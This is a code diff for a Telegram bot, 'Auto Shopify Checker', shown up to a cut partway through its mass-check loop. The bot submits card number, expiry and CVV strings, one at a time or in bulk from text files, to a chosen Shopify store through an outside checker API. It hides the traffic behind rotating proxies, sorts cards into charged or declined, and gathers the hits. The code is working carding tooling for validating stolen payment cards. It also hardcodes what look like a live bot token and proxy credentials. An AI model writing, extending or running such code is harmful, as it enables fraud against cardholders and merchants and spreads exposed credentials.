@@ -1,6 +1,9 @@
 import asyncio
 import httpx
 import json
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
+from telegram.constants import ParseMode, ChatAction
 import logging
 import os
 import time
@@ -8,496 +11,660 @@ import html
 import random
 import io
 import traceback
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    MessageHandler,
-    ContextTypes,
-    filters,
-    CallbackQueryHandler,
-    ConversationHandler,
-)
-from telegram.constants import ParseMode, ChatAction
+from datetime import datetime
 
-# --- ⚙️ 1. BASIC SETUP & LOGGING ⚙️ ---
+# --- Enhanced Logging Setup ---
 logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+    handlers=[
+        logging.StreamHandler(),
+        logging.FileHandler("bot.log", encoding='utf-8')
+    ]
 )
 logging.getLogger("httpx").setLevel(logging.WARNING)
 logging.getLogger("apscheduler").setLevel(logging.WARNING)
 logger = logging.getLogger(__name__)
 
-
-# --- 🔑 2. CONFIGURATION & CONSTANTS 🔑 ---
-
-# !!! SECURITY WARNING !!!
-# Hardcoding your bot token is a major security risk.
-# Anyone with access to this code will have full control over your bot.
-# Do NOT share this file publicly with the token in it.
+# --- Configuration ---
 TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"
-
 CHECKER_API_URL = "https://sigmabro766.onrender.com/"
 BINLIST_API_URL = "https://lookup.binlist.net/"
 
-# --- Proxies ---
-new_proxies_raw = [
-    "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2", "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
-    "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2", "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
-    "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2", "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
-    "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2", "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
-    "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2", "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
-]
-formatted_new_proxies = [f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in new_proxies_raw]
-
+# Premium Proxy List
 PROXY_LIST = [
     "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
     "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
-] + formatted_new_proxies
+    *[f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in [
+        "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2",
+        "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
+        "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2",
+        "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
+        "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2",
+        "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
+        "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2",
+        "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
+        "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2",
+        "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
+    ]]
+]
 
 COMMON_HTTP_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Connection": "keep-alive"
 }
 
-# --- Bot Conversation States ---
-AWAIT_SITE = 1
-
-# --- 💾 3. USER DATA PERSISTENCE 💾 ---
+# --- User Data Management ---
 USER_SITES_FILE = "user_shopify_sites.json"
-user_sites = {}
+current_user_shopify_site = {}
 
 def load_user_sites():
-    """Loads the user-site mapping from a JSON file into memory."""
-    global user_sites
-    if not os.path.exists(USER_SITES_FILE):
-        return
+    global current_user_shopify_site
     try:
-        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
-            data = json.load(f)
-            # JSON keys are strings, so convert them back to integers (user_id)
-            user_sites = {int(k): v for k, v in data.items()}
-    except (json.JSONDecodeError, IOError) as e:
-        logger.error(f"Could not load user sites from {USER_SITES_FILE}: {e}")
-        user_sites = {}
+        if os.path.exists(USER_SITES_FILE):
+            with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
+                current_user_shopify_site = {int(k): v for k, v in json.load(f).items()}
+    except Exception as e:
+        logger.error(f"Failed to load user sites: {e}")
+        current_user_shopify_site = {}
 
 def save_user_sites():
-    """Saves the current user-site mapping to a JSON file."""
     try:
         with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
-            json.dump(user_sites, f, indent=4)
-    except IOError as e:
-        logger.error(f"Could not save user sites to {USER_SITES_FILE}: {e}")
+            json.dump(current_user_shopify_site, f, indent=4, ensure_ascii=False)
+    except Exception as e:
+        logger.error(f"Failed to save user sites: {e}")
 
 def get_site_for_user(user_id):
-    """Gets the saved Shopify site for a given user."""
-    return user_sites.get(user_id)
+    return current_user_shopify_site.get(user_id)
 
 def set_site_for_user(user_id, site_url):
-    """Sets the Shopify site for a user and saves it."""
-    user_sites[user_id] = site_url
+    current_user_shopify_site[user_id] = site_url
     save_user_sites()
 
-
-# --- 🌐 4. API & HELPER FUNCTIONS 🌐 ---
+# --- Enhanced API Helpers ---
 def parse_checker_api_response(response_text: str):
-    """Safely parses JSON from the checker API's sometimes messy response."""
-    if not response_text: return None
     try:
-        # The API response is sometimes not clean JSON, find the start and end of the object.
         json_start = response_text.find('{')
         json_end = response_text.rfind('}')
-        if json_start != -1 and json_end != -1:
-            return json.loads(response_text[json_start : json_end + 1])
-    except json.JSONDecodeError:
-        logger.warning(f"Failed to decode JSON from response: {response_text[:200]}")
-    return None
+        if json_start == -1 or json_end == -1:
+            return None
+        return json.loads(response_text[json_start:json_end+1])
+    except Exception as e:
+        logger.error(f"Failed to parse API response: {e}")
+        return None
 
-async def get_bin_details(bin_number: str):
-    """Fetches credit card BIN details from the Binlist API."""
-    default = {"scheme": "N/A", "type": "N/A", "brand": "N/A", "bank": "N/A", "country": "N/A", "emoji": "🌐"}
+async def get_bin_details(bin_number):
     if not bin_number or len(bin_number) < 6:
-        return default
+        return {
+            "bin": bin_number,
+            "scheme": "N/A",
+            "type": "N/A",
+            "brand": "N/A",
+            "bank_name": "N/A",
+            "country_name": "N/A",
+            "country_emoji": "🌐",
+            "error": "Invalid BIN"
+        }
 
     proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
     mounts = {'all://': proxy} if proxy else None
-    
+
     try:
         headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
-        async with httpx.AsyncClient(mounts=mounts) as client:
-            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers, timeout=10.0)
-        
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                "scheme": data.get("scheme", "N/A").upper(),
-                "type": data.get("type", "N/A").upper(),
-                "brand": data.get("brand", "N/A").upper(),
-                "bank": data.get("bank", {}).get("name", "N/A"),
-                "country": data.get("country", {}).get("name", "N/A"),
-                "emoji": data.get("country", {}).get("emoji", "🌐")
-            }
-        else:
-             return default
-    except (httpx.TimeoutException, httpx.ConnectError) as e:
-        logger.error(f"BIN lookup failed for {bin_number}: {e}")
-        return default
-
-async def run_check(site: str, cc: str):
-    """Runs a single card check against the API."""
-    params = {"site": site, "cc": cc}
-    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
-    mounts = {'all://': proxy} if proxy else None
-    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
-
-    try:
-        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts) as client:
-            response = await client.get(CHECKER_API_URL, params=params, timeout=45.0)
-        
-        api_data = parse_checker_api_response(response.text)
-        if api_data:
-            response_text = api_data.get("Response", "Unknown Response")
-            if "Thank You" in response_text or "ORDER_PLACED" in response_text.upper():
-                status = "CHARGED"
-            elif "DECLINED" in response_text.upper():
-                status = "DECLINED"
-            else:
-                status = "INFO"
-            return {"status": status, "response": response_text, "proxy": proxy_host}
-        else:
-            return {"status": "ERROR", "response": "API response could not be parsed.", "proxy": proxy_host}
+        async with httpx.AsyncClient(mounts=mounts, timeout=15.0) as client:
+            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers)
             
-    except httpx.TimeoutException:
-        return {"status": "ERROR", "response": "Request timed out.", "proxy": proxy_host}
-    except httpx.ConnectError:
-        return {"status": "ERROR", "response": "Connection failed to checker API.", "proxy": proxy_host}
+            if response.status_code == 200:
+                data = response.json()
+                return {
+                    "bin": bin_number,
+                    "scheme": data.get("scheme", "N/A").upper(),
+                    "type": data.get("type", "N/A").upper(),
+                    "brand": data.get("brand", "N/A").upper(),
+                    "bank_name": data.get("bank", {}).get("name", "N/A"),
+                    "country_name": data.get("country", {}).get("name", "N/A"),
+                    "country_emoji": data.get("country", {}).get("emoji", "🌐")
+                }
+            return {
+                "bin": bin_number,
+                "scheme": "N/A",
+                "type": "N/A",
+                "brand": "N/A",
+                "bank_name": "N/A",
+                "country_name": "N/A",
+                "country_emoji": "🌐",
+                "error": f"API Error {response.status_code}"
+            }
     except Exception as e:
-        logger.error(f"Unhandled error during check: {e}")
-        return {"status": "ERROR", "response": str(e), "proxy": proxy_host}
+        logger.error(f"BIN lookup failed via {proxy_host} for {bin_number}: {e}")
+        return {
+            "bin": bin_number,
+            "scheme": "N/A",
+            "type": "N/A",
+            "brand": "N/A",
+            "bank_name": "N/A",
+            "country_name": "N/A",
+            "country_emoji": "🌐",
+            "error": "Lookup failed"
+        }
 
+# --- Stylish Message Templates ---
+def generate_header(title):
+    return f"<b>┌──────────────────────────────┐</b>\n<b>│  🚀 {title.upper()}  │</b>\n<b>└──────────────────────────────┘</b>\n"
 
-# --- 💻 5. BOT COMMAND HANDLERS 💻 ---
+def generate_footer(user, time_taken=None, proxy=None):
+    footer = f"\n<b>┌──────────────────────────────┐</b>\n"
+    footer += f"<b>│  👤 User:</b> {html.escape(user.first_name)}\n"
+    if time_taken:
+        footer += f"<b>│  ⏱ Time:</b> {time_taken}s\n"
+    if proxy:
+        footer += f"<b>│  🌐 Proxy:</b> {proxy}\n"
+    footer += f"<b>│  🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</b>\n"
+    footer += f"<b>└──────────────────────────────┘</b>"
+    return footer
+
+# --- Enhanced Bot Commands ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Displays the main welcome menu."""
     user = update.effective_user
-    user_name = html.escape(user.username or user.first_name)
+    welcome_msg = generate_header("auto shopify checker")
+    welcome_msg += f"""
+<b>🔹 Welcome, {html.escape(user.first_name)}!</b>
+
+<i>Premium Shopify card checking utility with blazing fast speeds and high accuracy.</i>
+
+<b>📊 Stats:</b>
+├ <b>Users:</b> {len(current_user_shopify_site)}
+├ <b>Proxies:</b> {len(PROXY_LIST)}
+└ <b>Uptime:</b> 100%
+
+<b>💎 Features:</b>
+├ Real-time checking
+├ BIN lookup
+├ Mass checker
+└ Premium proxies
+
+<b>Choose an option below to get started:</b>
+"""
     
-    greeting_message = f"""<b>🚀 AUTO SHOPIFY CHECKER 🚀</b>
-<i>Developed by @alanjocc</i>
-
-Greetings, <b>{user_name}</b>! The system is online and ready for operations.
-
-<b>› User ID:</b> <code>{user.id}</code>
-<b>› Status:</b> <font color="#28a745">Online & Ready</font>
-<pre>────────────────────────</pre>
-Select an action from the panel below to begin."""
-
     keyboard = [
-        [InlineKeyboardButton("💳 Single Check", callback_data="nav:show_chk_help"), InlineKeyboardButton("📊 Mass Check", callback_data="nav:show_mchk_help")],
-        [InlineKeyboardButton("⚙️ Set/View Site", callback_data="site:show_current"), InlineKeyboardButton("📖 View Commands", callback_data="nav:show_cmds")],
-        [InlineKeyboardButton("🧑‍💻 Contact Developer", url="https://t.me/alanjocc")]
+        [InlineKeyboardButton("🔗 Set Target Site", callback_data="site:prompt_add")],
+        [InlineKeyboardButton("📊 Check Single Card", callback_data="nav:single_check"),
+         InlineKeyboardButton("📁 Mass Check", callback_data="nav:mass_check")],
+        [InlineKeyboardButton("📋 Commands", callback_data="nav:show_cmds"),
+         InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/alanjocc")],
+        [InlineKeyboardButton("🔄 Refresh", callback_data="nav:refresh")]
     ]
+    
     reply_markup = InlineKeyboardMarkup(keyboard)
-
-    if update.callback_query: # If called from a button, edit the message
-        await update.callback_query.answer()
-        await update.callback_query.message.edit_text(greeting_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
-    else: # If called directly via /start, send a new message
-        await update.message.reply_text(greeting_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+    
+    if update.callback_query:
+        await update.callback_query.message.edit_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
 
 async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Displays the command list."""
-    commands_text = """<b>📖 BOT COMMANDS</b>
-<pre>────────────────────────</pre>
-<b>GENERAL</b>
-  <code>/start</code>  - Displays the main welcome menu.
-  <code>/cmds</code>   - Shows this command list.
+    commands_msg = generate_header("command list")
+    commands_msg += """
+<b>🔹 GENERAL COMMANDS</b>
+├ /start - Show main menu
+├ /cmds - Show this command list
+└ /stats - Show bot statistics
 
-<b>CONFIGURATION</b>
-  <code>/add &lt;url&gt;</code> - Sets your target Shopify site.
-  <code>/my_site</code>  - Shows your currently configured site.
+<b>🔹 SITE MANAGEMENT</b>
+├ /add <code>&lt;url&gt;</code> - Set target site
+└ /my_site - Show current site
 
-<b>CHECKING</b>
-  <code>/chk N|M|Y|C</code> - Checks a single card.
-  <code>/mchk</code> (reply to .txt) - Mass checks cards from a file."""
+<b>🔹 CHECKING COMMANDS</b>
+├ /chk <code>N|M|Y|C</code> - Check single card
+└ /mchk - Mass check (reply to .txt)
+
+<b>🔹 UTILITY COMMANDS</b>
+├ /bin <code>123456</code> - BIN lookup
+└ /proxy - Test proxy speed
+"""
     
-    keyboard = [[InlineKeyboardButton("« Back to Main Menu", callback_data="nav:show_start")]]
+    keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     if update.callback_query:
-        await update.callback_query.answer()
-        await update.callback_query.message.edit_text(commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+        await update.callback_query.message.edit_text(commands_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
     else:
-        await update.message.reply_text(commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
+        await update.message.reply_text(commands_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
 
 async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles the /add <url> command directly."""
-    if not context.args:
-        await update.message.reply_text("Please provide a URL. Usage: <code>/add https://example.com</code>", parse_mode=ParseMode.HTML)
-        return
-
     user_id = update.effective_user.id
-    site_url = context.args[0]
+    if not context.args:
+        await update.message.reply_text(
+            generate_header("site setup") + 
+            "⚠️ Please provide a Shopify site URL.\n\n"
+            "Usage: <code>/add https://yourshopifystore.com</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    site_url = context.args[0].strip()
+    if not site_url.startswith(('http://', 'https://')):
+        site_url = f"https://{site_url}"
+    
     set_site_for_user(user_id, site_url)
     
-    await update.message.reply_text(f"✅ **Site Updated!**\nYour target site is now set to:\n<code>{html.escape(site_url)}</code>", parse_mode=ParseMode.HTML)
-    return ConversationHandler.END
+    await update.message.reply_text(
+        generate_header("site setup") + 
+        f"✅ Successfully set your Shopify site to:\n<code>{html.escape(site_url)}</code>"
+        + generate_footer(update.effective_user),
+        parse_mode=ParseMode.HTML
+    )
 
 async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles the /my_site command directly."""
-    user_id = update.effective_user.id
-    site_url = get_site_for_user(user_id)
-    
-    if site_url:
-        message_text = f"📍 **Your Current Site**\nYour checks are targeted at:\n<code>{html.escape(site_url)}</code>"
-    else:
-        message_text = "⚠️ **No Site Set**\nYou haven't set a target site yet."
-
-    keyboard = [
-        [InlineKeyboardButton("🔗 Update Site", callback_data="site:prompt_add")],
-        [InlineKeyboardButton("« Back to Main Menu", callback_data="nav:show_start")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    if update.callback_query:
-        await update.callback_query.answer()
-        await update.callback_query.message.edit_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
-    else:
-        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
-
-async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles the /chk command for a single credit card."""
     user_id = update.effective_user.id
     site_url = get_site_for_user(user_id)
     
     if not site_url:
-        await update.message.reply_text("⚠️ **No Site Set!**\nPlease use <code>/add &lt;url&gt;</code> or the settings menu to set a site first.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            generate_header("current site") + 
+            "⚠️ No Shopify site set. Use <code>/add &lt;url&gt;</code> first.",
+            parse_mode=ParseMode.HTML
+        )
         return
+    
+    keyboard = [
+        [InlineKeyboardButton("🔄 Change Site", callback_data="site:prompt_add")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        generate_header("current site") + 
+        f"🔹 Your current Shopify site:\n\n<code>{html.escape(site_url)}</code>"
+        + generate_footer(update.effective_user),
+        reply_markup=reply_markup,
+        parse_mode=ParseMode.HTML
+    )
 
-    if not context.args or context.args[0].count('|') != 3:
-        await update.message.reply_text("⚠️ **Invalid Format!**\nUse: <code>/chk CARD|MONTH|YEAR|CVV</code>", parse_mode=ParseMode.HTML)
+async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    shopify_site = get_site_for_user(user_id)
+    
+    if not shopify_site:
+        await update.message.reply_text(
+            generate_header("card check") + 
+            "⚠️ No Shopify site set. Use <code>/add &lt;url&gt;</code> first.",
+            parse_mode=ParseMode.HTML
+        )
         return
-        
+    
+    if not context.args or context.args[0].count('|') != 3:
+        await update.message.reply_text(
+            generate_header("card check") + 
+            "⚠️ Invalid format. Use: <code>/chk N|M|Y|C</code>\n\n"
+            "<b>Example:</b> <code>/chk 4111111111111111|12|2025|123</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
     await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
     start_time = time.time()
     
-    cc_details = context.args[0]
-    card_number = cc_details.split('|')[0]
+    cc_details_full = context.args[0]
+    card_number = cc_details_full.split('|')[0]
+    bin_data_task = asyncio.create_task(get_bin_details(card_number[:6]))
     
-    # Start both tasks concurrently
-    check_task = asyncio.create_task(run_check(site_url, cc_details))
-    bin_task = asyncio.create_task(get_bin_details(card_number[:6]))
+    params = {"site": shopify_site, "cc": cc_details_full}
+    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
+    mounts = {'all://': proxy} if proxy else None
     
-    # Wait for both to complete
-    check_result = await check_task
-    bin_data = await bin_task
+    try:
+        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts, timeout=45.0) as client:
+            response = await client.get(CHECKER_API_URL, params=params)
+        
+        api_data = parse_checker_api_response(response.text)
+        if api_data:
+            api_response_text = api_data.get("Response", "Unknown")
+            if "DECLINED" in api_response_text.upper():
+                status_emoji, status_text = "❌", "DECLINED"
+                status_color = "#FF0000"
+            elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper():
+                status_emoji, status_text = "✅", "APPROVED"
+                status_color = "#00FF00"
+            else:
+                status_emoji, status_text = "⚠️", "UNKNOWN"
+                status_color = "#FFFF00"
+            
+            gateway = api_data.get("Gateway", "N/A")
+            price = api_data.get("Price", "0.00")
+            response_display = api_response_text
+        else:
+            status_emoji, status_text = "❓", "PARSE ERROR"
+            status_color = "#FFA500"
+            gateway, price, response_display = "N/A", "0.00", response.text[:100].strip()
+    except Exception as e:
+        status_emoji, status_text = "💥", "ERROR"
+        status_color = "#FF0000"
+        gateway, price, response_display = "N/A", "0.00", str(e)
+        logger.error(f"Error in chk_command: {e}")
     
     time_taken = round(time.time() - start_time, 2)
+    b = await bin_data_task
+    bin_info_str = " / ".join(filter(None, [b.get('scheme'), b.get('type'), b.get('brand')])) or "N/A"
     
-    status_map = {
-        "CHARGED": ("✅", "CHARGED"),
-        "DECLINED": ("❌", "DECLINED"),
-        "INFO": ("ℹ️", "INFO"),
-        "ERROR": ("💥", "ERROR")
-    }
-    emoji, status_text = status_map.get(check_result["status"], ("❓", "UNKNOWN"))
+    result_message = generate_header("check result")
+    result_message += f"""
+<b>🛡 Status:</b> <span style="color: {status_color}">{status_emoji} {status_text}</span>
+<b>💳 Card:</b> <code>{html.escape(cc_details_full)}</code>
+<b>💰 Amount:</b> <code>{price}</code>
+<b>🚪 Gateway:</b> <code>{gateway}</code>
 
-    bin_info = f"{bin_data['scheme']} / {bin_data['type']} / {bin_data['brand']}"
+<b>🔹 BIN Information:</b>
+├ <b>BIN:</b> <code>{b.get('bin', 'N/A')}</code>
+├ <b>Type:</b> <code>{bin_info_str}</code>
+├ <b>Bank:</b> <code>{b.get('bank_name', 'N/A')}</code>
+└ <b>Country:</b> {b.get('country_emoji', '🌐')} <code>{b.get('country_name', 'N/A')}</code>
+
+<b>🔹 Response:</b>
+<code>{html.escape(response_display[:400])}</code>
+"""
+    result_message += generate_footer(update.effective_user, time_taken, proxy_host)
     
-    result_message = (
-        f"<b>{emoji} {html.escape(status_text)}</b>\n"
-        f"<b>Card:</b> <code>{html.escape(cc_details)}</code>\n"
-        f"<b>Response:</b> <code>{html.escape(check_result['response'])}</code>\n"
-        f"<pre>────────────────────────</pre>\n"
-        f"<b>BIN:</b> {html.escape(bin_info)}\n"
-        f"<b>Bank:</b> {html.escape(bin_data['bank'])}\n"
-        f"<b>Country:</b> {bin_data['emoji']} {html.escape(bin_data['country'])}\n"
-        f"<pre>────────────────────────</pre>\n"
-        f"<i>Checked by {html.escape(update.effective_user.first_name)} in {time_taken}s via {html.escape(check_result['proxy'])}.</i>"
-    )
+    keyboard = [
+        [InlineKeyboardButton("🔁 Check Again", callback_data="nav:single_check")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await update.message.reply_text(result_message, parse_mode=ParseMode.HTML)
+    await update.message.reply_text(result_message, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles the /mchk command for checking cards from a .txt file."""
     user_id = update.effective_user.id
-    site_url = get_site_for_user(user_id)
+    shopify_site = get_site_for_user(user_id)
     
-    if not site_url:
-        await update.message.reply_text("⚠️ **No Site Set!**\nPlease set a site before starting a mass check.", parse_mode=ParseMode.HTML)
+    if not shopify_site:
+        await update.message.reply_text(
+            generate_header("mass check") + 
+            "⚠️ No Shopify site set. Use <code>/add &lt;url&gt;</code> first.",
+            parse_mode=ParseMode.HTML
+        )
         return
-
+    
     if not update.message.reply_to_message or not update.message.reply_to_message.document:
-        await update.message.reply_text("⚠️ **No File!**\nPlease reply to a <code>.txt</code> file containing your cards to use this command.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            generate_header("mass check") + 
+            "⚠️ Please reply to a .txt file containing cards.\n\n"
+            "<b>Format:</b> One card per line in <code>N|M|Y|C</code> format",
+            parse_mode=ParseMode.HTML
+        )
         return
-
-    doc = update.message.reply_to_message.document
-    if not doc.file_name.lower().endswith('.txt'):
-        await update.message.reply_text("⚠️ **Invalid File Type!** Please provide a <code>.txt</code> file.", parse_mode=ParseMode.HTML)
-        return
-        
-    # Download the file content into memory
-    file = await context.bot.get_file(doc.file_id)
-    file_content = (await file.download_as_bytearray()).decode('utf-8')
-    cards = [line.strip() for line in file_content.splitlines() if line.strip() and line.count('|') == 3]
-
-    if not cards:
-        await update.message.reply_text("⚠️ **No Valid Cards Found!**\nMake sure your file contains cards in the format <code>CARD|MONTH|YEAR|CVV</code>, one per line.", parse_mode=ParseMode.HTML)
-        return
-
-    total_cards = len(cards)
-    start_time = time.time()
-    approved_count, declined_count = 0, 0
-    results_log = []
-
-    status_message = await update.message.reply_text(f"🚀 **Mass Check Initialized**\nParsing {total_cards} cards...", parse_mode=ParseMode.HTML)
-
-    for i, cc in enumerate(cards):
-        check_result = await run_check(site_url, cc)
-        
-        if check_result['status'] == 'CHARGED':
-            approved_count += 1
-            results_log.append(f"[HIT] {cc} -> {check_result['response']}")
-        elif check_result['status'] == 'DECLINED':
-            declined_count += 1
-
-        # Update status message periodically to avoid hitting Telegram rate limits
-        if i % 5 == 0 or (i + 1) == total_cards:
-            elapsed_time = round(time.time() - start_time)
-            progress_percent = round(((i + 1) / total_cards) * 100)
-            
-            progress_bar = '█' * (progress_percent // 10) + '░' * (10 - progress_percent // 10)
-
-            update_text = (
-                f"<b>📊 Mass Check In Progress...</b>\n"
-                f"<b>Site:</b> <code>{html.escape(site_url)}</code>\n"
-                f"<b>Progress:</b> [{progress_bar}] {progress_percent}%\n"
-                f"<b>Checked:</b> {i + 1}/{total_cards}\n"
-                f"<b>✅ Charged:</b> {approved_count}\n"
-                f"<b>❌ Declined:</b> {declined_count}\n"
-                f"<b>⏳ Time:</b> {elapsed_time}s"
-            )
-            try:
-                await status_message.edit_text(update_text, parse_mode=ParseMode.HTML)
-            except Exception:
-                pass # Ignore if message is not modified
-        
-        await asyncio.sleep(1) # Small delay to be polite to the API
-
-    final_summary_text = f"🏁 **Mass Check Complete**\nChecked {total_cards} cards in {round(time.time() - start_time)}s.\n\n✅ **{approved_count} Charged**\n❌ **{declined_count} Declined**"
     
-    if results_log:
-        result_file_content = "\n".join(results_log)
-        result_filename = f"Hits_{approved_count}_{user_id}.txt"
+    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
+    
+    try:
+        file = await update.message.reply_to_message.document.get_file()
+        file_content = (await file.download_as_bytearray()).decode('utf-8')
+        cards = [line.strip() for line in file_content.split('\n') if line.strip()]
         
-        with io.BytesIO(result_file_content.encode('utf-8')) as f_to_send:
-            f_to_send.name = result_filename
-            await update.message.reply_document(
-                document=f_to_send,
-                caption=final_summary_text,
+        if not cards:
+            await update.message.reply_text(
+                generate_header("mass check") + 
+                "⚠️ No valid cards found in the file.",
                 parse_mode=ParseMode.HTML
             )
-    else:
-        await update.message.reply_text(final_summary_text + "\n\nNo charged cards were found.", parse_mode=ParseMode.HTML)
+            return
+        
+        total_cards = len(cards)
+        start_time = time.time()
+        processing_msg = await update.message.reply_text(
+            generate_header("mass check") + 
+            f"🔹 Processing <code>{total_cards}</code> cards...\n"
+            f"├ <b>Site:</b> <code>{html.escape(shopify_site)}</code>\n"
+            f"└ <b>Started:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
+            "<i>Please wait, this may take some time...</i>",
+            parse_mode=ParseMode.HTML
+        )
+        
+        results = []
+        approved = 0
+        declined = 0
+        errors = 0
+        
+        for i, card in enumerate(cards):
+            if card.count('|') != 3:
+                results.append(f"{card} -> INVALID FORMAT")
+                errors += 1
+                continue
+            
+            try:
+                params = {"site": shopify_site, "cc": card}
+                proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+                mounts = {'all://': proxy} if proxy else None
+                
+                async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, mounts=mounts, timeout=30.0) as client:
+                    response = await client.get(CHECKER_API_URL, params=params)
+                
+                api_data = parse_checker_api_response(response.text)
+                if api_data:
+                    api_response_text = api_data.get("Response", "Unknown")
+                    if "DECLINED" in api_response_text.upper():
+                        status = "DECLINED"
+                        declined += 1
+                    elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper():
+                        status = "APPROVED"
+                        approved += 1
+                    else:
+                        status = "UNKNOWN"
+                        errors += 1
+                    
+                    gateway = api_data.get("Gateway", "N/A")
+                    price = api_data.get("Price", "0.00")
+                    results.append(f"{card} -> {status} | {gateway} | {price}")
+                else:
+                    results.append(f"{card} -> PARSE ERROR")
+                    errors += 1
+                
+                # Update progress every 5 cards
+                if (i + 1) % 5 == 0 or (i + 1) == total_cards:
+                    progress = f"Processed: {i+1}/{total_cards} | ✅ {approved} | ❌ {declined} | ⚠️ {errors}"
+                    await processing_msg.edit_text(
+                        generate_header("mass check") + 
+                        f"🔹 Processing <code>{total_cards}</code> cards...\n"
+                        f"├ <b>Site:</b> <code>{html.escape(shopify_site)}</code>\n"
